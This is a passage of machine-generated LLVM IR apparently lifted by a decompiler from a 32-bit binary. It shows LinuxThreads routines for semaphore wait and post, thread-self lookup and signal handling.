  %v1_8056ab5 = add i32 %v0_8056aac, 64
  %v2_8056ab5 = inttoptr i32 %v1_8056ab5 to i8*
  %v3_8056ab5 = load i8, i8* %v2_8056ab5, align 1
  %v4_8056ab5 = icmp eq i8 %v3_8056ab5, 0
  %v1_8056ab9 = icmp eq i1 %v4_8056ab5, false
  br i1 %v1_8056ab9, label %dec_label_pc_8056ae9, label %dec_label_pc_8056abb

dec_label_pc_8056abb:                             ; preds = %dec_label_pc_8056ab5
  store i8 0, i8* %v2_8056aac, align 1
  br label %dec_label_pc_8056ac2

dec_label_pc_8056ac2:                             ; preds = %dec_label_pc_8056a44, %dec_label_pc_8056abb
  store i32 -1, i32* %stack_var_-60, align 4
  %v2_8056acb = call i32 @__pthread_do_exit(i32 -1, i32 %v4_805699d)
  br label %dec_label_pc_8056ad0

dec_label_pc_8056ad0:                             ; preds = %dec_label_pc_8056a5f, %dec_label_pc_8056ac2
  %stack_var_-56.0 = phi i32 [ %v4_805699d, %dec_label_pc_8056ac2 ], [ %v0_8056a51, %dec_label_pc_8056a5f ]
  store i32 0, i32* @edx, align 4
  %v0_8056ad2 = load i32, i32* @esi, align 4
  store i32 %v0_8056ad2, i32* @eax, align 4
  %v0_8056ad4 = load i32, i32* %stack_var_-60, align 4
  %v2_8056ad4 = call i32 @__pthread_set_own_extricate_if.2(i32 %v0_8056ad4, i32 %stack_var_-56.0)
  %v1_8056ad9 = call i32 @__errno_location(i32 %v0_8056ad4)
  %v1_8056ade = inttoptr i32 %v1_8056ad9 to i32*
  store i32 110, i32* %v1_8056ade, align 4
  br label %dec_label_pc_8056aeb

dec_label_pc_8056ae9:                             ; preds = %dec_label_pc_8056ab5, %dec_label_pc_8056aa3
  br label %dec_label_pc_8056aeb

dec_label_pc_8056aeb:                             ; preds = %dec_label_pc_8056ad0, %dec_label_pc_80569f1, %dec_label_pc_8056ae9
  %v0_8056af2 = phi i32 [ -1, %dec_label_pc_8056ad0 ], [ %storemerge, %dec_label_pc_80569f1 ], [ 0, %dec_label_pc_8056ae9 ]
  ret i32 %v0_8056af2

; uselistorder directives
  uselistorder i32 %v0_8056a8b, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32 %v0_8056a6d, { 1, 0 }
  uselistorder i32 %v0_8056a52, { 1, 0 }
  uselistorder i32 %v3_80569b9, { 1, 0 }
  uselistorder i32 %v0_80569b9, { 1, 0, 3, 2, 4 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-60, { 2, 4, 1, 5, 0, 6, 3, 7, 8, 9 }
  uselistorder i32* %stack_var_-24, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8056aeb, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056ad0, { 1, 0 }
  uselistorder label %dec_label_pc_8056ac2, { 1, 0 }
  uselistorder label %dec_label_pc_8056a8b, { 1, 0 }
  uselistorder label %dec_label_pc_8056a34, { 1, 0 }
  uselistorder label %dec_label_pc_80569f1, { 1, 0 }
}

define i32 @__new_sem_wait(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8056af3 = load i32, i32* @esi, align 4
  %v0_8056af4 = load i32, i32* @ebx, align 4
  store i32 %v0_8056af4, i32* %stack_var_-8, align 4
  %v4_8056af4 = ptrtoint i32* %stack_var_-8 to i32
  %v2_8056af8 = call i32 @thread_self.3(i32 %v0_8056af4, i32 %v0_8056af3)
  store i32 %arg1, i32* @ebx, align 4
  store i32 %v2_8056af8, i32* @edx, align 4
  store i32 %arg1, i32* @eax, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v1_8056b17 = call i32 @__pthread_lock(i32 %arg1)
  %v0_8056b1c = load i32, i32* @ebx, align 4
  %v1_8056b1c = add i32 %v0_8056b1c, 8
  %v2_8056b1c = inttoptr i32 %v1_8056b1c to i32*
  %v3_8056b1c = load i32, i32* %v2_8056b1c, align 4
  %tmp12 = icmp slt i32 %v3_8056b1c, 1
  br i1 %tmp12, label %dec_label_pc_8056b38, label %dec_label_pc_8056b23

dec_label_pc_8056b23:                             ; preds = %entry
  %v1_8056b26 = add i32 %v3_8056b1c, -1
  store i32 %v1_8056b26, i32* %v2_8056b1c, align 4
  %v0_8056b2a = load i32, i32* @ebx, align 4
  store i32 %v0_8056b2a, i32* %stack_var_-44, align 4
  %v1_8056b2b = inttoptr i32 %v0_8056b2a to i32*
  %v2_8056b2b = call i32 @__pthread_unlock(i32* %v1_8056b2b)
  br label %dec_label_pc_8056bfc

dec_label_pc_8056b38:                             ; preds = %entry
  %v2_8056b3c = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8056b3c, i32* @edx, align 4
  %v1_8056b40 = add i32 %v2_8056af8, 442
  %v2_8056b40 = inttoptr i32 %v1_8056b40 to i8*
  store i8 0, i8* %v2_8056b40, align 1
  store i32 %v2_8056af8, i32* @eax, align 4
  %v0_8056b4b = load i32, i32* %stack_var_-44, align 4
  %v2_8056b4b = call i32 @__pthread_set_own_extricate_if.2(i32 %v0_8056b4b, i32 %tmp8)
  %v1_8056b54 = add i32 %v2_8056af8, 66
  %v2_8056b54 = inttoptr i32 %v1_8056b54 to i8*
  %v3_8056b54 = load i8, i8* %v2_8056b54, align 1
  %v4_8056b54 = icmp eq i8 %v3_8056b54, 0
  br i1 %v4_8056b54, label %dec_label_pc_8056b69, label %dec_label_pc_8056b5a

dec_label_pc_8056b5a:                             ; preds = %dec_label_pc_8056b38
  store i32 1, i32* @esi, align 4
  %v1_8056b63 = add i32 %v2_8056af8, 64
  %v2_8056b63 = inttoptr i32 %v1_8056b63 to i8*
  %v3_8056b63 = load i8, i8* %v2_8056b63, align 1
  %v4_8056b63 = icmp eq i8 %v3_8056b63, 0
  br i1 %v4_8056b63, label %dec_label_pc_8056b77, label %dec_label_pc_8056b69

dec_label_pc_8056b69:                             ; preds = %dec_label_pc_8056b5a, %dec_label_pc_8056b38
  store i32 %v2_8056af8, i32* @edx, align 4
  %v0_8056b70 = call i32 @enqueue()
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8056b77

dec_label_pc_8056b77:                             ; preds = %dec_label_pc_8056b5a, %dec_label_pc_8056b69
  %v0_8056b7a = load i32, i32* @ebx, align 4
  store i32 %v0_8056b7a, i32* %stack_var_-44, align 4
  %v1_8056b7b = inttoptr i32 %v0_8056b7a to i32*
  %v2_8056b7b = call i32 @__pthread_unlock(i32* %v1_8056b7b)
  %v0_8056b83 = load i32, i32* @esi, align 4
  %v1_8056b83 = icmp eq i32 %v0_8056b83, 0
  br i1 %v1_8056b83, label %dec_label_pc_8056b94.preheader, label %dec_label_pc_8056b87

dec_label_pc_8056b94.preheader:                   ; preds = %dec_label_pc_8056b77
  %v1_8056bae = add i32 %v2_8056af8, 440
  %v2_8056bae = inttoptr i32 %v1_8056bae to i8*
  %v1_8056bbb = add i32 %v2_8056af8, 64
  %v2_8056bbb = inttoptr i32 %v1_8056bbb to i8*
  store i32 %v2_8056af8, i32* @eax, align 4
  %v0_8056b9813 = call i32 @suspend.4()
  %v3_8056ba114 = load i8, i8* %v2_8056b40, align 1
  %v4_8056ba115 = icmp eq i8 %v3_8056ba114, 0
  %v1_8056ba816 = icmp eq i1 %v4_8056ba115, false
  br i1 %v1_8056ba816, label %dec_label_pc_8056bc1, label %dec_label_pc_8056baa

dec_label_pc_8056b87:                             ; preds = %dec_label_pc_8056b77
  store i32 %v2_8056af8, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_8056b8d = load i32, i32* %stack_var_-44, align 4
  %v2_8056b8d = call i32 @__pthread_set_own_extricate_if.2(i32 %v0_8056b8d, i32 %tmp8)
  br label %dec_label_pc_8056bee

dec_label_pc_8056baa:                             ; preds = %dec_label_pc_8056b94.preheader, %dec_label_pc_8056b94.backedge
  %v3_8056bae = load i8, i8* %v2_8056bae, align 1
  %v4_8056bae = icmp eq i8 %v3_8056bae, 0
  br i1 %v4_8056bae, label %dec_label_pc_8056b94.backedge, label %dec_label_pc_8056bb7

dec_label_pc_8056b94.backedge:                    ; preds = %dec_label_pc_8056baa, %dec_label_pc_8056bb7
  store i32 %v2_8056af8, i32* @eax, align 4
  %v0_8056b98 = call i32 @suspend.4()
  %v3_8056ba1 = load i8, i8* %v2_8056b40, align 1
  %v4_8056ba1 = icmp eq i8 %v3_8056ba1, 0
  %v1_8056ba8 = icmp eq i1 %v4_8056ba1, false
  br i1 %v1_8056ba8, label %dec_label_pc_8056bc1, label %dec_label_pc_8056baa

dec_label_pc_8056bb7:                             ; preds = %dec_label_pc_8056baa
  %v3_8056bbb = load i8, i8* %v2_8056bbb, align 1
  %v4_8056bbb = icmp eq i8 %v3_8056bbb, 0
  %v1_8056bbf = icmp eq i1 %v4_8056bbb, false
  br i1 %v1_8056bbf, label %dec_label_pc_8056b94.backedge, label %dec_label_pc_8056bc1

dec_label_pc_8056bc1:                             ; preds = %dec_label_pc_8056b94.backedge, %dec_label_pc_8056bb7, %dec_label_pc_8056b94.preheader
  store i32 %v2_8056af8, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_8056bc7 = load i32, i32* %stack_var_-44, align 4
  %v2_8056bc7 = call i32 @__pthread_set_own_extricate_if.2(i32 %v0_8056bc7, i32 %tmp8)
  %v3_8056bd0 = load i8, i8* %v2_8056bae, align 1
  %v4_8056bd0 = icmp eq i8 %v3_8056bd0, 0
  br i1 %v4_8056bd0, label %dec_label_pc_8056bfc, label %dec_label_pc_8056bd9

dec_label_pc_8056bd9:                             ; preds = %dec_label_pc_8056bc1
  %v3_8056bdd = load i8, i8* %v2_8056bbb, align 1
  %v4_8056bdd = icmp eq i8 %v3_8056bdd, 0
  %v1_8056be1 = icmp eq i1 %v4_8056bdd, false
  br i1 %v1_8056be1, label %dec_label_pc_8056bfc, label %dec_label_pc_8056be3

dec_label_pc_8056be3:                             ; preds = %dec_label_pc_8056bd9
  store i8 0, i8* %v2_8056bae, align 1
  br label %dec_label_pc_8056bee

dec_label_pc_8056bee:                             ; preds = %dec_label_pc_8056b87, %dec_label_pc_8056be3
  store i32 -1, i32* %stack_var_-44, align 4
  %v2_8056bf7 = call i32 @__pthread_do_exit(i32 -1, i32 %v4_8056af4)
  br label %dec_label_pc_8056bfc

dec_label_pc_8056bfc:                             ; preds = %dec_label_pc_8056bd9, %dec_label_pc_8056bc1, %dec_label_pc_8056b23, %dec_label_pc_8056bee
  ret i32 0

; uselistorder directives
  uselistorder i8* %v2_8056bae, { 1, 0, 2 }
  uselistorder i8* %v2_8056b40, { 1, 0, 2 }
  uselistorder i32 %v3_8056b1c, { 1, 0 }
  uselistorder i32 %v2_8056af8, { 5, 6, 2, 0, 3, 4, 7, 1, 9, 8, 10, 11 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder i32 %tmp8, { 1, 0, 2 }
  uselistorder i32* %stack_var_-44, { 3, 2, 1, 4, 0, 5 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32 ()* @suspend.4, { 2, 0, 1 }
  uselistorder i32 ()* @enqueue, { 1, 0 }
  uselistorder i32 (i32, i32)* @__pthread_set_own_extricate_if.2, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8056bfc, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8056bee, { 1, 0 }
  uselistorder label %dec_label_pc_8056bc1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8056b94.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_8056baa, { 1, 0 }
  uselistorder label %dec_label_pc_8056b77, { 1, 0 }
}

define i32 @__new_sem_post() local_unnamed_addr {
entry:
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %tmp13 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp13, i32* %stack_var_-188, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8056c04 = load i32, i32* @esi, align 4
  %v0_8056c05 = load i32, i32* @ebx, align 4
  store i32 %v0_8056c05, i32* %stack_var_-8, align 4
  %v2_8056c0c = call i32 @thread_self.3(i32 %v0_8056c05, i32 %v0_8056c04)
  store i32 %tmp8, i32* @esi, align 4
  %v1_8056c18 = add i32 %v2_8056c0c, 84
  %v2_8056c18 = inttoptr i32 %v1_8056c18 to i32*
  %v3_8056c18 = load i32, i32* %v2_8056c18, align 4
  %v4_8056c18 = icmp eq i32 %v3_8056c18, 0
  %v1_8056c1c = icmp eq i1 %v4_8056c18, false
  br i1 %v1_8056c1c, label %dec_label_pc_8056c95, label %dec_label_pc_8056c1e

dec_label_pc_8056c1e:                             ; preds = %entry
  store i32 %v2_8056c0c, i32* @edx, align 4
  store i32 %tmp8, i32* @eax, align 4
  %v0_8056c22 = load i32, i32* %stack_var_-8, align 4
  %v1_8056c22 = call i32 @__pthread_lock(i32 %v0_8056c22)
  %v0_8056c27 = load i32, i32* @esi, align 4
  %v1_8056c27 = add i32 %v0_8056c27, 12
  %v2_8056c27 = inttoptr i32 %v1_8056c27 to i32*
  %v3_8056c27 = load i32, i32* %v2_8056c27, align 4
  %v4_8056c27 = icmp eq i32 %v3_8056c27, 0
  %v1_8056c2b = icmp eq i1 %v4_8056c27, false
  br i1 %v1_8056c2b, label %dec_label_pc_8056c7b, label %dec_label_pc_8056c2d

dec_label_pc_8056c2d:                             ; preds = %dec_label_pc_8056c1e
  %v1_8056c2d = add i32 %v0_8056c27, 8
  %v2_8056c2d = inttoptr i32 %v1_8056c2d to i32*
  %v3_8056c2d = load i32, i32* %v2_8056c2d, align 4
  %v9_8056c30 = icmp eq i32 %v3_8056c2d, 2147483647
  %v1_8056c35 = icmp eq i1 %v9_8056c30, false
  br i1 %v1_8056c35, label %dec_label_pc_8056c50, label %dec_label_pc_8056c37

dec_label_pc_8056c37:                             ; preds = %dec_label_pc_8056c2d
  %v0_8056c37 = load i32, i32* %stack_var_-8, align 4
  %v1_8056c37 = call i32 @__errno_location(i32 %v0_8056c37)
  %v1_8056c3f = inttoptr i32 %v1_8056c37 to i32*
  store i32 34, i32* %v1_8056c3f, align 4
  %v0_8056c45 = load i32, i32* @esi, align 4
  store i32 %v0_8056c45, i32* %stack_var_-188, align 4
  %v1_8056c46 = inttoptr i32 %v0_8056c45 to i32*
  %v2_8056c46 = call i32 @__pthread_unlock(i32* %v1_8056c46)
  br label %dec_label_pc_8056c5f

dec_label_pc_8056c50:                             ; preds = %dec_label_pc_8056c2d
  %v1_8056c50 = add i32 %v3_8056c2d, 1
  store i32 %v1_8056c50, i32* %v2_8056c2d, align 4
  %v0_8056c57 = load i32, i32* @esi, align 4
  store i32 %v0_8056c57, i32* %stack_var_-188, align 4
  %v1_8056c58 = inttoptr i32 %v0_8056c57 to i32*
  %v2_8056c58 = call i32 @__pthread_unlock(i32* %v1_8056c58)
  br label %dec_label_pc_8056c5f

dec_label_pc_8056c5f:                             ; preds = %dec_label_pc_8056c50, %dec_label_pc_8056c7b, %dec_label_pc_8056c37
  %storemerge = phi i32 [ -1, %dec_label_pc_8056c37 ], [ 0, %dec_label_pc_8056c7b ], [ 0, %dec_label_pc_8056c50 ]
  br label %dec_label_pc_8056ceb

dec_label_pc_8056c7b:                             ; preds = %dec_label_pc_8056c1e
  store i32 %v3_8056c27, i32* @ebx, align 4
  %v1_8056c6e = add i32 %v3_8056c27, 8
  %v2_8056c6e = inttoptr i32 %v1_8056c6e to i32*
  %v3_8056c6e = load i32, i32* %v2_8056c6e, align 4
  store i32 %v3_8056c6e, i32* %v2_8056c27, align 4
  store i32 0, i32* %v2_8056c6e, align 4
  %v0_8056c7e.pre = load i32, i32* @esi, align 4
  store i32 %v0_8056c7e.pre, i32* %stack_var_-188, align 4
  %v1_8056c7f = inttoptr i32 %v0_8056c7e.pre to i32*
  %v2_8056c7f = call i32 @__pthread_unlock(i32* %v1_8056c7f)
  %v1_8056c84 = add i32 %v3_8056c27, 442
  %v2_8056c84 = inttoptr i32 %v1_8056c84 to i8*
  store i8 1, i8* %v2_8056c84, align 1
  store i32 %v3_8056c27, i32* %stack_var_-188, align 4
  %v1_8056c8e = call i32 @__pthread_restart_new(i32 %v3_8056c27)
  br label %dec_label_pc_8056c5f

dec_label_pc_8056c95:                             ; preds = %entry
  %v0_8056c95 = load i32, i32* @global_var_8073c84.658, align 4
  %v2_8056c95 = icmp slt i32 %v0_8056c95, 0
  %v1_8056c9c = icmp eq i1 %v2_8056c95, false
  br i1 %v1_8056c9c, label %dec_label_pc_8056cc3.preheader, label %dec_label_pc_8056c9e

dec_label_pc_8056cc3.preheader:                   ; preds = %dec_label_pc_8056c9e, %dec_label_pc_8056c95
  %v2_8056cc3 = ptrtoint i32* %stack_var_-156 to i32
  br label %dec_label_pc_8056cc3

dec_label_pc_8056c9e:                             ; preds = %dec_label_pc_8056c95
  %v1_8056c9e = call i32 @__pthread_initialize_manager(i32 %tmp13)
  %v2_8056ca3 = icmp slt i32 %v1_8056c9e, 0
  %v1_8056ca5 = icmp eq i1 %v2_8056ca3, false
  br i1 %v1_8056ca5, label %dec_label_pc_8056cc3.preheader, label %dec_label_pc_8056ca7

dec_label_pc_8056ca7:                             ; preds = %dec_label_pc_8056c9e
  %v0_8056ca7 = load i32, i32* %stack_var_-188, align 4
  %v1_8056ca7 = call i32 @__errno_location(i32 %v0_8056ca7)
  %v1_8056cac = inttoptr i32 %v1_8056ca7 to i32*
  store i32 11, i32* %v1_8056cac, align 4
  br label %dec_label_pc_8056ceb

dec_label_pc_8056cc3:                             ; preds = %dec_label_pc_8056cc3.preheader, %dec_label_pc_8056cdf
  %v0_8056cce = load i32, i32* @global_var_8073c84.658, align 4
  store i32 %v0_8056cce, i32* %stack_var_-188, align 4
  %v3_8056cd4 = call i32 @__libc_write(i32 %v0_8056cce, i32 %v2_8056cc3, i32 148)
  %v8_8056cdc = icmp eq i32 %v3_8056cd4, -1
  %v1_8056cdd = icmp eq i1 %v8_8056cdc, false
  br i1 %v1_8056cdd, label %dec_label_pc_8056ce9, label %dec_label_pc_8056cdf

dec_label_pc_8056cdf:                             ; preds = %dec_label_pc_8056cc3
  %v0_8056cdf = load i32, i32* %stack_var_-188, align 4
  %v1_8056cdf = call i32 @__errno_location(i32 %v0_8056cdf)
  %v1_8056ce4 = inttoptr i32 %v1_8056cdf to i32*
  %v2_8056ce4 = load i32, i32* %v1_8056ce4, align 4
  %v11_8056ce4 = icmp eq i32 %v2_8056ce4, 4
  br i1 %v11_8056ce4, label %dec_label_pc_8056cc3, label %dec_label_pc_8056ce9

dec_label_pc_8056ce9:                             ; preds = %dec_label_pc_8056cdf, %dec_label_pc_8056cc3
  br label %dec_label_pc_8056ceb

dec_label_pc_8056ceb:                             ; preds = %dec_label_pc_8056ca7, %dec_label_pc_8056c5f, %dec_label_pc_8056ce9
  %v0_8056cf3 = phi i32 [ -1, %dec_label_pc_8056ca7 ], [ %storemerge, %dec_label_pc_8056c5f ], [ 0, %dec_label_pc_8056ce9 ]
  %v2_8056cf1 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8056cf1, i32* @ebx, align 4
  store i32 %v0_8056c04, i32* @esi, align 4
  ret i32 %v0_8056cf3

; uselistorder directives
  uselistorder i32 %v3_8056c2d, { 1, 0 }
  uselistorder i32 %v3_8056c27, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-8, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-188, { 2, 3, 1, 4, 5, 6, 7, 0 }
  uselistorder i32 (i32, i32)* @thread_self.3, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8056ceb, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056cc3, { 1, 0 }
  uselistorder label %dec_label_pc_8056c5f, { 1, 0, 2 }
}

define i32 @pthread_null_sighandler() local_unnamed_addr {
entry:
  %v0_8056cf4 = load i32, i32* @eax, align 4
  ret i32 %v0_8056cf4
}

define i32 @thread_self.5(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %v0_8056cfc = load i32, i32* @esp, align 4
  %v1_8056cfc = load i32, i32* @global_var_807a620.650, align 32
  %v7_8056cfc = icmp ult i32 %v0_8056cfc, %v1_8056cfc
  %v1_8056d02 = icmp eq i1 %v7_8056cfc, false
  br i1 %v1_8056d02, label %dec_label_pc_8056d33, label %dec_label_pc_8056d04

dec_label_pc_8056d04:                             ; preds = %entry
  %v1_8056d04 = load i32, i32* @global_var_807a624.651, align 4
  %v7_8056d04 = icmp ult i32 %v0_8056cfc, %v1_8056d04
  br i1 %v7_8056d04, label %dec_label_pc_8056d19, label %dec_label_pc_8056d0c

dec_label_pc_8056d0c:                             ; preds = %dec_label_pc_8056d04
  %v1_8056d11 = load i32, i32* @global_var_807a628.653, align 8
  %v7_8056d11 = icmp ult i32 %v0_8056cfc, %v1_8056d11
  br i1 %v7_8056d11, label %dec_label_pc_8056d33, label %dec_label_pc_8056d19

dec_label_pc_8056d19:                             ; preds = %dec_label_pc_8056d0c, %dec_label_pc_8056d04
  %v0_8056d19 = load i32, i32* @global_var_807e100.654, align 256
  %v1_8056d19 = icmp eq i32 %v0_8056d19, 0
  br i1 %v1_8056d19, label %dec_label_pc_8056d27, label %dec_label_pc_8056d22

dec_label_pc_8056d22:                             ; preds = %dec_label_pc_8056d19
  %v0_8056d22 = call i32 @__pthread_find_self()
  br label %dec_label_pc_8056d27

dec_label_pc_8056d27:                             ; preds = %dec_label_pc_8056d19, %dec_label_pc_8056d22
  %v2_8056d2d = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_8056d33

dec_label_pc_8056d33:                             ; preds = %dec_label_pc_8056d0c, %entry, %dec_label_pc_8056d27
  %v0_8056d33 = phi i32 [ ptrtoint (i32* @global_var_8073aa0.652 to i32), %dec_label_pc_8056d0c ], [ ptrtoint (i32* @global_var_80738c0 to i32), %entry ], [ %v2_8056d2d, %dec_label_pc_8056d27 ]
  ret i32 %v0_8056d33

; uselistorder directives
  uselistorder label %dec_label_pc_8056d33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056d27, { 1, 0 }
}

define i32 @pthread_sighandler_rt(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8056d34 = load i32, i32* @edi, align 4
  %v0_8056d35 = load i32, i32* @esi, align 4
  %v0_8056d36 = load i32, i32* @ebx, align 4
  store i32 %v0_8056d36, i32* %stack_var_-12, align 4
  %v3_8056d37 = call i32 @thread_self.5(i32 %v0_8056d36, i32 %v0_8056d35, i32 %v0_8056d34)
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %v3_8056d37, i32* %ebx.global-to-local, align 4
  %v1_8056d42 = add i32 %v3_8056d37, 88
  %v2_8056d42 = inttoptr i32 %v1_8056d42 to i8*
  %v3_8056d42 = load i8, i8* %v2_8056d42, align 1
  %v4_8056d42 = icmp eq i8 %v3_8056d42, 0
  br i1 %v4_8056d42, label %dec_label_pc_8056d51, label %dec_label_pc_8056d48

dec_label_pc_8056d48:                             ; preds = %entry
  store i8 0, i8* %v2_8056d42, align 1
  %v0_8056d4c = load i32, i32* %edi.global-to-local, align 4
  %v2_8056d4c = add i32 %v3_8056d37, 32
  %v3_8056d4c = inttoptr i32 %v2_8056d4c to i32*
  store i32 %v0_8056d4c, i32* %v3_8056d4c, align 4
  br label %dec_label_pc_8056d7a

dec_label_pc_8056d51:                             ; preds = %entry
  %v4_8056d36 = ptrtoint i32* %stack_var_-12 to i32
  %v1_8056d51 = add i32 %v3_8056d37, 84
  %v2_8056d51 = inttoptr i32 %v1_8056d51 to i32*
  %v3_8056d51 = load i32, i32* %v2_8056d51, align 4
  %v1_8056d54 = icmp eq i32 %v3_8056d51, 0
  store i32 %v4_8056d36, i32* %v2_8056d51, align 4
  %v0_8056d64 = load i32, i32* %edi.global-to-local, align 4
  %v5_8056d65 = mul i32 %v0_8056d64, 4
  %v6_8056d65 = add i32 %v5_8056d65, ptrtoint (i32* @global_var_80784e0.685 to i32)
  %v7_8056d65 = inttoptr i32 %v6_8056d65 to i32*
  %v8_8056d65 = load i32, i32* %v7_8056d65, align 4
  call void @__pseudo_call(i32 %v8_8056d65)
  %v1_8056d71 = icmp eq i1 %v1_8056d54, false
  br i1 %v1_8056d71, label %dec_label_pc_8056d7a, label %dec_label_pc_8056d73

dec_label_pc_8056d73:                             ; preds = %dec_label_pc_8056d51
  %v0_8056d73 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056d73 = add i32 %v0_8056d73, 84
  %v2_8056d73 = inttoptr i32 %v1_8056d73 to i32*
  store i32 0, i32* %v2_8056d73, align 4
  br label %dec_label_pc_8056d7a

dec_label_pc_8056d7a:                             ; preds = %dec_label_pc_8056d51, %dec_label_pc_8056d48, %dec_label_pc_8056d73
  %v2_8056d7a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8056d7a, i32* %ebx.global-to-local, align 4
  store i32 %v0_8056d34, i32* %edi.global-to-local, align 4
  ret i32 %v3_8056d37

; uselistorder directives
  uselistorder i32 %v3_8056d37, { 2, 0, 1, 3, 4 }
  uselistorder i32* %stack_var_-12, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8056d7a, { 2, 0, 1 }
}

define i32 @pthread_sighandler(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_8 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8056d7e = load i32, i32* @edi, align 4
  %v0_8056d7f = load i32, i32* @esi, align 4
  %v0_8056d80 = load i32, i32* @ebx, align 4
  store i32 %v0_8056d80, i32* %stack_var_-12, align 4
  %v3_8056d81 = call i32 @thread_self.5(i32 %v0_8056d80, i32 %v0_8056d7f, i32 %v0_8056d7e)
  store i32 %v3_8056d81, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %v3_8056d81, i32* %ebx.global-to-local, align 4
  %v1_8056d8c = add i32 %v3_8056d81, 88
  %v2_8056d8c = inttoptr i32 %v1_8056d8c to i8*
  %v3_8056d8c = load i8, i8* %v2_8056d8c, align 1
  %v4_8056d8c = icmp eq i8 %v3_8056d8c, 0
  br i1 %v4_8056d8c, label %dec_label_pc_8056d9b, label %dec_label_pc_8056d92

dec_label_pc_8056d92:                             ; preds = %entry
  store i8 0, i8* %v2_8056d8c, align 1
  %v0_8056d96 = load i32, i32* @esi, align 4
  %v1_8056d96 = load i32, i32* %eax.global-to-local, align 4
  %v2_8056d96 = add i32 %v1_8056d96, 32
  %v3_8056d96 = inttoptr i32 %v2_8056d96 to i32*
  store i32 %v0_8056d96, i32* %v3_8056d96, align 4
  br label %dec_label_pc_8056dd2

dec_label_pc_8056d9b:                             ; preds = %entry
  %v4_8056d80 = ptrtoint i32* %stack_var_-12 to i32
  %v1_8056d9b = add i32 %v3_8056d81, 84
  %v2_8056d9b = inttoptr i32 %v1_8056d9b to i32*
  %v3_8056d9b = load i32, i32* %v2_8056d9b, align 4
  %v1_8056d9e = icmp eq i32 %v3_8056d9b, 0
  store i32 %v4_8056d80, i32* %v2_8056d9b, align 4
  %v2_8056daa = ptrtoint i32* %stack_var_8 to i32
  store i32 %v2_8056daa, i32* %eax.global-to-local, align 4
  %v3_8056db4 = bitcast i32* %stack_var_-104 to i16*
  %v4_8056db4 = call i32 @memcpy(i16* %v3_8056db4, i32 %v2_8056daa, i32 88)
  store i32 %v4_8056db4, i32* %eax.global-to-local, align 4
  %v0_8056dbc = load i32, i32* @esi, align 4
  %v5_8056dbd = mul i32 %v0_8056dbc, 4
  %v6_8056dbd = add i32 %v5_8056dbd, ptrtoint (i32* @global_var_80784e0.685 to i32)
  %v7_8056dbd = inttoptr i32 %v6_8056dbd to i32*
  %v8_8056dbd = load i32, i32* %v7_8056dbd, align 4
  call void @__pseudo_call(i32 %v8_8056dbd)
  %v1_8056dc9 = icmp eq i1 %v1_8056d9e, false
  br i1 %v1_8056dc9, label %dec_label_pc_8056dd2, label %dec_label_pc_8056dcb

dec_label_pc_8056dcb:                             ; preds = %dec_label_pc_8056d9b
  %v0_8056dcb = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056dcb = add i32 %v0_8056dcb, 84
  %v2_8056dcb = inttoptr i32 %v1_8056dcb to i32*
  store i32 0, i32* %v2_8056dcb, align 4
  br label %dec_label_pc_8056dd2

dec_label_pc_8056dd2:                             ; preds = %dec_label_pc_8056d9b, %dec_label_pc_8056d92, %dec_label_pc_8056dcb
  %v2_8056dd2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8056dd2, i32* %ebx.global-to-local, align 4
  %v0_8056dd5 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8056dd5

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_8056dd2, { 2, 0, 1 }
}

define i32 @__GI_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp9 = ptrtoint i32* %arg2 to i32
  %stack_var_-156 = alloca i32, align 4
